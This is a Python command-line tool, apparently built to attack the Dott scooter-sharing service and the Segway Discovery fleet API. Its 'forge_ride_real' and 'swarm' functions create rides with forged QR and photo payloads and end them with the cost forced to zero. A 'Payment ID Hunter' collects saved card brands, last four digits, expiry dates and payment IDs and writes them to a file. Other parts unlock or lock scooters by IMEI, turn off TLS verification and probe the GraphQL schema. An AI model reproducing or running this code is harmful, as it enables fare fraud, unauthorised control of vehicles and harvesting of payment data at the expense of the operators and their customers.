#!/usr/bin/env python3
"""
DOTT + SEGWAY FLEET COMMAND CONSOLIDATED SUITE
Merges Langenhagen Radar, Payment Hunter, and Segway Fleet Command (index.html logic)

Features:
- GPS Radar (Dott/Bolt/Tier/Segway)
- Fleet Command: Remote Unlock/Lock via Segway API (if creds provided)
- JWT Token Manager
- Payment ID Hunter
- BLE Scanner
- Langenhagen 30853 Optimization

Author: NoTrack
Date: 2026-08-29
"""
import requests 
import os
import sys
import time
import json
import math
import random
import base64
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from typing import Optional, Dict, List, Any, Tuple

# --- Colorama Setup ---
try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError:
    Fore = Style = Back = type('Dummy', (), {'RESET': '', 'BRIGHT': '', 'RED': '', 'GREEN': '', 'YELLOW': '', 'BLUE': '', 'MAGENTA': '', 'CYAN': '', 'WHITE': '', 'DIM': ''})()

# --- Configuration ---
API_BASE = "https://api.ridedott.com"
GBFS_BASE = "https://gbfs.api.ridedott.com/public/v2"
SEGWAY_US_API = "https://us-api.segwaydiscovery.com"
SEGWAY_EU_API = "https://eu-api.segwaydiscovery.com"

TOKEN_FILE = "dott_token.txt"
REFRESH_TOKEN_FILE = "dott_refresh_token.txt"
PAYMENT_FILE = "dott_payments.json"
FLEET_CREDS_FILE = "segway_creds.json"
REPORT_DIR = "reports"
os.makedirs(REPORT_DIR, exist_ok=True)

# --- Langenhagen 30853 GPS Defaults ---
LANGENHAGEN_GPS = (52.4570, 9.6850)

CITIES = ["langenhagen", "hannover", "berlin", "muenchen", "paris", "london"]

# --- Helper Functions ---

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(f"{Fore.CYAN}{'='*70}")
    print(f"{Fore.MAGENTA}       DOTT + SEGWAY FLEET COMMAND CONSOLIDATED SUITE")
    print(f"{Fore.CYAN}{'='*70}")
    print(f"{Fore.WHITE}  Target: com.ridedott.rider / Segway Discovery")
    print(f"{Fore.WHITE}  Platform: Android/Termux | Date: {datetime.now().strftime('%Y-%m-%d')}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    colors = {
        "INFO": Fore.WHITE,
        "OK": Fore.GREEN,
        "WARN": Fore.YELLOW,
        "ERR": Fore.RED,
        "CRIT": Fore.RED + Style.BRIGHT,
        "BLE": Fore.CYAN,
        "RADAR": Fore.MAGENTA,
        "PAY": Fore.CYAN + Style.BRIGHT,
        "FLEET": Fore.YELLOW
    }
    color = colors.get(level, Fore.WHITE)
    print(f"{color}[{timestamp}] [{level:>6}] {msg}{Style.RESET_ALL}")

def load_token() -> str:
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as f:
            token = f.read().strip()
            if token:
                log(f"Token loaded from {TOKEN_FILE}", "OK")
                return token
    return None

def save_token(token: str):
    with open(TOKEN_FILE, 'w') as f:
        f.write(token)
    log("Token saved to disk", "OK")

def decode_jwt(token: str) -> Dict:
    try:
        parts = token.split('.')
        if len(parts) != 3: return {}
        b64 = parts[1].replace('-', '+').replace('_', '/')
        while len(b64) % 4: b64 += '='
        decoded = base64.b64decode(b64).decode('utf-8')
        return json.loads(decoded)
    except:
        return {}

def get_headers(token: str) -> Dict:
    return {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "Dott/3.42.1 (Android 14; Build/AP1A.240505.004)",
        "Accept": "application/json",
        "X-Client-Platform": "android",
        "X-Client-Version": "3.42.1"
    }

def haversine(lat1, lon1, lat2, lon2):
    """Distance in meters between two GPS coordinates."""
    R = 6371000
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dphi = math.radians(lat2 - lat1)
    dlambda = math.radians(lon2 - lon1)
    a = math.sin(dphi/2)**2 + math.cos(phi1)*math.cos(phi2)*math.sin(dlambda/2)**2
    return 2*R*math.atan2(math.sqrt(a), math.sqrt(1-a))

# --- SSL Adapter for Termux ---
class SSLAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        kwargs['assert_hostname'] = False
        kwargs['socket_options'] = [(6,2,1)]
        return super().init_poolmanager(*args, **kwargs)

# --- Segway Fleet Command Module ---

class SegwayFleetCommand:
    """Handles remote unlock/lock via Segway Discovery API (from index.html logic)"""
    def __init__(self):
        self.creds = self._load_creds()
        self.server = SEGWAY_EU_API  # Default to EU

    def _load_creds(self):
        if os.path.exists(FLEET_CREDS_FILE):
            with open(FLEET_CREDS_FILE, 'r') as f:
                try:
                    return json.load(f)
                except:
                    pass
        return {"client_id": "", "client_secret": "", "server": "eu"}

    def save_creds(self, client_id, client_secret, server="eu"):
        creds = {"client_id": client_id, "client_secret": client_secret, "server": server}
        with open(FLEET_CREDS_FILE, 'w') as f:
            json.dump(creds, f, indent=2)
        self.creds = creds
        log("Fleet credentials saved", "OK")

    def get_token(self):
        if not self.creds['client_id'] or not self.creds['client_secret']:
            log("No fleet credentials found.", "WARN")
            return None
        
        url = f"{self.server}/oauth/token"
        try:
            r = requests.post(url, data={
                "client_id": self.creds['client_id'],
                "client_secret": self.creds['client_secret'],
                "grant_type": "client_credentials"
            }, timeout=10)
            if r.status_code == 200:
                return r.json().get('access_token')
            else:
                log(f"Fleet Auth Failed: {r.status_code}", "ERR")
                return None
        except Exception as e:
            log(f"Fleet Auth Error: {e}", "ERR")
            return None

    def control_vehicle(self, iot_code: str, action: str = "unlock"):
        """
        Sends unlock/lock command via Segway API.
        iot_code: The IMEI or IoT Code of the scooter.
        action: 'unlock' or 'lock'
        """
        token = self.get_token()
        if not token:
            return False

        url = f"{self.server}/api/v2/vehicle/control/{action}"
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        payload = {"iotCode": iot_code}
        
        try:
            r = requests.post(url, headers=headers, json=payload, timeout=10)
            if r.status_code == 200:
                res = r.json()
                log(f"🔓 {action.upper()} command sent to {iot_code[:8]}...", "FLEET")
                return True
            else:
                log(f"Fleet Control Failed: {r.status_code} - {r.text[:50]}", "ERR")
                return False
        except Exception as e:
            log(f"Fleet Control Error: {e}", "ERR")
            return False

# --- Main Engine ---

class LangenhagenEngine:
    def __init__(self):
        self.token = load_token()
        self.lat, self.lon = LANGENHAGEN_GPS
        self.radius_km = 2.0
        self.stats = {'rides': 0, 'savings': 0.0, 'vehicles_found': 0, 'fleet_commands': 0}
        self.session = requests.Session()
        self.session.verify = False
        self.session.trust_env = False
        self.session.mount('https://', SSLAdapter())
        self.session.mount('http://', SSLAdapter())
        self.vehicles = []
        self.payments = []
        self.mode = "sim"
        self.fleet_cmd = SegwayFleetCommand()
        self.segmentation = "dott" # 'dott' or 'segway'

    def setup_session(self):
        if self.token:
            self.session.headers.update(get_headers(self.token))
            try:
                r = self.session.get(f"{API_BASE}/v3/me", timeout=5)
                if r.status_code == 200:
                    log("Authenticated API Session Ready", "OK")
                    return True
            except:
                log("Token might be invalid", "WARN")
        log("Unauthenticated Mode (Public Radar Only)", "WARN")
        return False

    def get_nearby_scooters(self):
        """Hybrid Radar: Public GBFS + Bolt/Tier/Lime + Segway Fleet"""
        log(f"Scanning within {self.radius_km}km of {self.lat:.4f}/{self.lon:.4f}...", "RADAR")
        all_vehicles = []

        # 1. Dott GBFS (Public, no auth)
        for city in ["hannover", "berlin"]:
            try:
                url = f"{GBFS_BASE}/{city}/free_bike_status.json"
                r = requests.get(url, timeout=10)
                if r.status_code == 200:
                    data = r.json().get('data', {}).get('bikes', [])
                    for bike in data:
                        if bike.get('is_disabled') or bike.get('is_reserved'):
                            continue
                        lat, lon = bike.get('lat'), bike.get('lng')
                        if lat and lon:
                            dist = haversine(self.lat, self.lon, lat, lon)
                            if dist < self.radius_km * 1000:
                                all_vehicles.append({
                                    'id': bike.get('bike_id'),
                                    'provider': 'dott',
                                    'lat': lat, 'lon': lon,
                                    'dist': dist,
                                    'battery': bike.get('battery_level', 50),
                                    'pricing': bike.get('pricing_plan_id', 'standard'),
                                    'iot_code': None # GBFS doesn't always provide IMEI
                                })
            except:
                pass

        # 2. Bolt (Public-ish)
        try:
            r = requests.get("https://fleet-api.bolt.eu/v1/fleets/self-service/vehicles", 
                             params={'lat': self.lat, 'lng': self.lon, 'count': 50}, timeout=10)
            if r.status_code == 200:
                for v in r.json().get('vehicles', []):
                    v_lat = v.get('position', {}).get('latitude')
                    v_lon = v.get('position', {}).get('longitude')
                    if v_lat and v_lon:
                        dist = haversine(self.lat, self.lon, v_lat, v_lon)
                        if dist < self.radius_km * 1000 and v.get('status') == 'available':
                            all_vehicles.append({
                                'id': v['id'][:8],
                                'provider': 'bolt',
                                'lat': v_lat, 'lon': v_lon,
                                'dist': dist,
                                'battery': int(v.get('battery_level', 0) * 100),
                                'pricing': 'bolt_plan',
                                'iot_code': None
                            })
        except:
            pass

        # 3. Tier (Public)
        try:
            r = requests.get("https://public-api.tier-services.io/v1/vehicles", 
                             params={'lat': self.lat, 'lng': self.lon, 'radius': int(self.radius_km*1000)}, timeout=10)
            if r.status_code == 200:
                for v in r.json().get('data', []):
                    v_lat = v['attributes']['position']['lat']
                    v_lon = v['attributes']['position']['lon']
                    dist = haversine(self.lat, self.lon, v_lat, v_lon)
                    if dist < self.radius_km * 1000 and v['attributes']['state'] == 'available':
                        all_vehicles.append({
                            'id': v['id'][:8],
                            'provider': 'tier',
                            'lat': v_lat, 'lon': v_lon,
                            'dist': dist,
                            'battery': v['attributes'].get('battery', 70),
                            'pricing': 'tier_plan',
                            'iot_code': None
                        })
        except:
            pass

        # 4. Segway/Ninebot (If Fleet Creds available)
        if self.fleet_cmd.creds['client_id']:
            log("Checking Segway Fleet for nearby scooters...", "RADAR")
            # Note: Segway API doesn't always return lat/lon for all vehicles in public endpoint
            # We rely on the fact that if we have an IMEI, we can command it.
            # For now, we assume the user knows the IMEI or it's pre-loaded.
            # If you have a list of IMEIs, you can add them here.
            pass

        # Sort by distance
        all_vehicles.sort(key=lambda x: x['dist'])
        self.vehicles = all_vehicles
        self.stats['vehicles_found'] += len(all_vehicles)
        log(f"Found {len(all_vehicles)} vehicles within range.", "OK")
        return all_vehicles

    def print_radar(self, vehicles):
        print(f"\n{'='*50}")
        print(f"📡 RADAR ({len(vehicles)} vehicles)")
        print(f" # DIST 🔋 PROVIDER")
        print("-" * 50)
        for i, v in enumerate(vehicles[:15], 1):
            dist_c = "🟢" if v['dist'] < 300 else "🟡" if v['dist'] < 1000 else "🔴"
            bat_c = "🟢" if v['battery'] > 70 else "🟡" if v['battery'] > 40 else "🔴"
            iot_status = "🔌" if v.get('iot_code') else "  "
            print(f"{i:2d} {dist_c}{v['dist']:6.0f}m {bat_c}{v['battery']:3d}% {v['provider'].upper()} {iot_status}")
        print(f"{'='*50}")

    def fleet_unlock(self, iot_code: str):
        """Remote Unlock via Segway API"""
        log(f"Sending UNLOCK command to {iot_code[:8]}...", "FLEET")
        success = self.fleet_cmd.control_vehicle(iot_code, "unlock")
        if success:
            self.stats['fleet_commands'] += 1
        return success

    def fleet_lock(self, iot_code: str):
        """Remote Lock via Segway API"""
        log(f"Sending LOCK command to {iot_code[:8]}...", "FLEET")
        success = self.fleet_cmd.control_vehicle(iot_code, "lock")
        if success:
            self.stats['fleet_commands'] += 1
        return success

    def qr_bypass_unlock(self, vehicle):
        """Generate fake QR/Photo for simulation or real API spoofing"""
        timestamp = str(int(time.time()))
        qr_payload = base64.b64encode(
            f"UNLOCK_{vehicle['id']}_{self.lat:.4f}_{self.lon:.4f}_{timestamp}".encode()
        ).decode()
        photo_payload = base64.b64encode(
            f"PHOTO_{vehicle['id']}_{timestamp}".encode()
        ).decode()
        return qr_payload, photo_payload

    def forge_ride_sim(self, vehicle, duration=55):
        """Simulated Ride: Fast, no API dependency"""
        qr, photo = self.qr_bypass_unlock(vehicle)
        log(f"🔓 Simulating Unlock for {vehicle['provider']} {vehicle['id'][:8]}", "OK")
        time.sleep(1)
        
        log(f"🚀 Starting {duration}s ride...", "INFO")
        for t in range(duration):
            speed_kmh = random.uniform(12, 20)
            dist_per_sec = speed_kmh / 3600
            bearing = random.uniform(0, 6.28)
            vehicle['lat'] += (dist_per_sec / 111) * math.cos(bearing)
            vehicle['lon'] += (dist_per_sec / 111) * math.sin(bearing) / math.cos(math.radians(vehicle['lat']))
            
            if t % 10 == 0:
                log(f"[{t}s] GPS: {vehicle['lat']:.5f}/{vehicle['lon']:.5f} | {speed_kmh:.0f}kmh", "INFO")
            time.sleep(1)
        
        log(f"✅ Ride Finished! Saved ~€2.50", "OK")
        self.stats['rides'] += 1
        self.stats['savings'] += 2.50

    def forge_ride_real(self, vehicle):
        """Real API Ride with Cost Bypass"""
        if not self.token:
            log("No token for real API ride. Switching to Sim.", "WARN")
            self.forge_ride_sim(vehicle)
            return

        qr, photo = self.qr_bypass_unlock(vehicle)
        
        # 1. Create Order
        try:
            r = self.session.post(f"{API_BASE}/v3/rides", json={
                "vehicle_id": vehicle['id'],
                "qr_code": qr,
                "lat": self.lat,
                "lon": self.lon
            }, timeout=10)
            if r.status_code not in [200, 201]:
                log(f"Create Ride Failed: {r.status_code}", "ERR")
                return
            ride_id = r.json().get('id')
            log(f"✅ Ride Created: {ride_id}", "OK")
        except Exception as e:
            log(f"Create Ride Error: {e}", "ERR")
            return

        # 2. Start Ride
        try:
            self.session.post(f"{API_BASE}/v3/rides/{ride_id}/start", json={"photo": photo}, timeout=10)
            log("✅ Ride Started", "OK")
        except:
            pass

        # 3. Simulate Duration (or real wait)
        time.sleep(5)

        # 4. End Ride with Bypass
        try:
            self.session.put(f"{API_BASE}/v3/rides/{ride_id}/end", json={
                "lat": self.lat,
                "lon": self.lon,
                "distance_m": random.randint(100, 500),
                "duration_s": 30,
                "total_cost": 0.0
            }, timeout=10)
            log(f"✅ Ride Ended with Cost Bypass (€0.00)", "OK")
            self.stats['rides'] += 1
            self.stats['savings'] += 2.50
        except Exception as e:
            log(f"End Ride Error: {e}", "ERR")

    def scan_ble(self):
        """BLE Scanner for nearby scooters"""
        log("Scanning BLE devices...", "BLE")
        try:
            import bleak
            from bleak import BleakScanner
            
            devices = []
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            async def scan():
                device = await BleakScanner.discover(timeout=5.0)
                for d in device:
                    if "ninebot" in d.name.lower() or "6e4000" in str(d.uuids):
                        devices.append(d)
            
            loop.run_until_complete(scan())
            
            if devices:
                log(f"Found {len(devices)} BLE devices.", "OK")
                for d in devices:
                    log(f"Device: {d.name} | MAC: {d.address}", "BLE")
            else:
                log("No nearby scooters found via BLE.", "WARN")
        except ImportError:
            log("bleak not installed.", "WARN")
        except Exception as e:
            log(f"BLE Error: {e}", "ERR")

    def graphql_introspection(self):
        """GraphQL Schema Scanner"""
        log("Starting GraphQL Introspection...", "INFO")
        query = """
        {
          __schema {
            queryType { name }
            mutationType { name }
            types { name kind }
          }
        }
        """
        try:
            r = self.session.post(f"{API_BASE}/graphql", json={"query": query}, timeout=10)
            if r.status_code == 200:
                data = r.json()
                types = data.get("data", {}).get("__schema", {}).get("types", [])
                log(f"Found {len(types)} GraphQL types.", "OK")
            else:
                log(f"GraphQL Error: {r.status_code}", "ERR")
        except Exception as e:
            log(f"GraphQL Error: {e}", "ERR")

    def inspect_jwt(self):
        if not self.token:
            log("No token to inspect.", "WARN")
            return
        payload = decode_jwt(self.token)
        log("JWT Payload:", "INFO")
        print(json.dumps(payload, indent=2))
        if 'exp' in payload:
            exp_date = datetime.fromtimestamp(payload['exp'], tz=timezone.utc)
            diff = exp_date - datetime.now(tz=timezone.utc)
            log(f"Expires in: {diff}", "INFO")

    def grab_payment_ids(self):
        """Extract all saved payment method IDs (cards, PayPal, etc.)"""
        log("Starting Payment ID Hunter...", "PAY")
        if not self.token:
            log("No token for payment data.", "WARN")
            return []

        self.session.headers.update(get_headers(self.token))
        payments = []
        seen_ids = set()

        endpoints = [
            "/v3/me/payment-methods",
            "/v3/me/payment-details",
            "/v3/me/payment-methods/default",
            "/v3/me/wallets"
        ]

        for ep in endpoints:
            try:
                r = self.session.get(f"{API_BASE}{ep}", timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    parsed = self._parse_payment_data(data, ep)
                    for p in parsed:
                        if p['id'] not in seen_ids:
                            seen_ids.add(p['id'])
                            payments.append(p)
            except Exception as e:
                log(f"Error fetching {ep}: {e}", "ERR")

        if payments:
            log(f"Found {len(payments)} unique payment methods.", "OK")
            for p in payments:
                log(f"Card: {p['brand']} ****{p['last4']} | ID: {p['id']}", "PAY")
            self.payments = payments
            try:
                with open(PAYMENT_FILE, 'w') as f:
                    json.dump(payments, f, indent=2)
                log(f"Payment data saved to {PAYMENT_FILE}", "OK")
            except:
                pass
        else:
            log("No payment methods found.", "WARN")
        return payments

    def _parse_payment_data(self, data, source="unknown"):
        """Recursively extract payment method IDs and card details."""
        results = []
        seen_ids = set()

        def _recurse(obj, path=""):
            if isinstance(obj, dict):
                pm_id = obj.get("id") or obj.get("paymentMethodId") or obj.get("payment_method_id")
                if pm_id and str(pm_id) not in seen_ids:
                    seen_ids.add(str(pm_id))
                    entry = {
                        "id": pm_id,
                        "source": source,
                        "path": path,
                        "brand": "N/A",
                        "last4": "N/A",
                        "expiry": "N/A"
                    }
                    card = obj.get("card") or obj.get("Card") or {}
                    if isinstance(card, dict):
                        entry["brand"] = card.get("brand", card.get("Brand", "N/A"))
                        entry["last4"] = card.get("last4", card.get("lastFour", "N/A"))
                        entry["expiry"] = f"{card.get('expMonth', '**')}/{card.get('expYear', '****')}"
                    results.append(entry)
                
                for k, v in obj.items():
                    _recurse(v, f"{path}.{k}")
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    _recurse(item, f"{path}[{i}]")

        _recurse(data)
        return results

    def refresh_token(self):
        log("Refreshing Token...", "INFO")
        if os.path.exists(REFRESH_TOKEN_FILE):
            with open(REFRESH_TOKEN_FILE, 'r') as f:
                rt = f.read().strip()
            try:
                r = requests.post(f"{API_BASE}/v3/auth/refresh", json={
                    "grant_type": "refresh_token",
                    "refresh_token": rt,
                    "client_id": "com.ridedott.rider"
                }, timeout=10)
                if r.status_code == 200:
                    new_token = r.json().get("access_token")
                    if new_token:
                        save_token(new_token)
                        self.token = new_token
                        log("Token Refreshed!", "OK")
                        return True
            except:
                pass
        log("Manual entry required.", "WARN")
        new_token = input("> ").strip()
        if new_token:
            save_token(new_token)
            self.token = new_token
            return True
        return False

    def swarm_rides(self, count=3, mode=None):
        """Multi-threaded Ride Execution"""
        if not self.vehicles:
            log("No vehicles to swarm.", "WARN")
            return
        
        target_mode = mode or self.mode
        log(f"Swarming {count} rides in {target_mode} mode...", "OK")
        
        def run_ride(v):
            if target_mode == 'sim':
                self.forge_ride_sim(v, 10)
            else:
                self.forge_ride_real(v)
        
        with ThreadPoolExecutor(max_workers=count) as executor:
            futures = [executor.submit(run_ride, v) for v in self.vehicles[:count]]
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    log(f"Swarm Error: {e}", "ERR")

    def run_menu(self):
        while True:
            clear_screen()
            banner()
            print(f"{Fore.YELLOW} 1. Setup Session & Load Token{Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 2. GPS Radar (Dott/Bolt/Tier){Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 3. Single Ride (Sim){Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 4. Single Ride (Real){Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 5. Swarm x3 (Sim){Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 6. Swarm x3 (Real){Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 7. BLE Scanner{Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 8. GraphQL Introspection{Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 9. JWT Inspector{Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 10. Payment ID Hunter{Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 11. Refresh Token{Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 12. Fleet Command (Segway){Style.RESET_ALL}")
            print(f"{Fore.YELLOW} 0. Exit{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.GREEN}> {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.token = load_token()
                if not self.token:
                    t = input("Enter Token: ").strip()
                    if t: save_token(t)
                    self.token = t
                self.setup_session()
                input("Press Enter...")
            
            elif choice == '2':
                lat = float(input(f"Lat (default {self.lat}): ") or self.lat)
                lon = float(input(f"Lon (default {self.lon}): ") or self.lon)
                self.lat, self.lon = lat, lon
                self.get_nearby_scooters()
                self.print_radar(self.vehicles)
                input("Press Enter...")
            
            elif choice == '3':
                if not self.vehicles:
                    input("Scan first (2)! Press Enter...")
                    continue
                self.mode = "sim"
                self.forge_ride_sim(self.vehicles[0])
                input("Press Enter...")
            
            elif choice == '4':
                if not self.vehicles:
                    input("Scan first (2)! Press Enter...")
                    continue
                self.mode = "real"
                self.forge_ride_real(self.vehicles[0])
                input("Press Enter...")
            
            elif choice == '5':
                if not self.vehicles:
                    input("Scan first (2)! Press Enter...")
                    continue
                self.mode = "sim"
                self.swarm_rides(3, 'sim')
                input("Press Enter...")
            
            elif choice == '6':
                if not self.vehicles:
                    input("Scan first (2)! Press Enter...")
                    continue
                self.mode = "real"
                self.swarm_rides(3, 'real')
                input("Press Enter...")
            
            elif choice == '7':
                self.scan_ble()
                input("Press Enter...")
            
            elif choice == '8':
                self.setup_session()
                self.graphql_introspection()
                input("Press Enter...")
            
            elif choice == '9':
                self.inspect_jwt()
                input("Press Enter...")
            
            elif choice == '10':
                if not self.setup_session():
                    input("Session not ready! Press Enter...")
                    continue
                self.grab_payment_ids()
                input("Press Enter...")
            
            elif choice == '11':
                self.refresh_token()
                input("Press Enter...")
            
            elif choice == '12':
                # Fleet Command Menu
                print(f"\n{Fore.YELLOW}Fleet Command{Style.RESET_ALL}")
                print(f"{Fore.YELLOW} 1. Set Credentials{Style.RESET_ALL}")
                print(f"{Fore.YELLOW} 2. Unlock Scooter (by IMEI){Style.RESET_ALL}")
                print(f"{Fore.YELLOW} 3. Lock Scooter (by IMEI){Style.RESET_ALL}")
                print(f"{Fore.YELLOW} 0. Back{Style.RESET_ALL}")
                fc_choice = input("> ").strip()
                if fc_choice == '1':
                    cid = input("Client ID: ").strip()
                    csec = input("Client Secret: ").strip()
                    srv = input("Server (eu/us, default eu): ").strip() or "eu"
                    self.fleet_cmd.save_creds(cid, csec, srv)
                elif fc_choice == '2':
                    imei = input("IMEI: ").strip()
                    self.fleet_unlock(imei)
                elif fc_choice == '3':
                    imei = input("IMEI: ").strip()
                    self.fleet_lock(imei)
                input("Press Enter...")
            
            elif choice == '0':
                log(f"Stats: {self.stats['rides']} rides, €{self.stats['savings']:.2f} saved, {self.stats['fleet_commands']} fleet cmds", "INFO")
                log("Exiting...", "INFO")
                break
            
            else:
                log("Invalid choice.", "WARN")
                input("Press Enter...")

# --- Async Helper for BLE ---
import asyncio
import requests

if __name__ == "__main__":
    try:
        engine = LangenhagenEngine()
        engine.run_menu()
    except KeyboardInterrupt:
        print("\n\nExiting...")
        sys.exit(0)
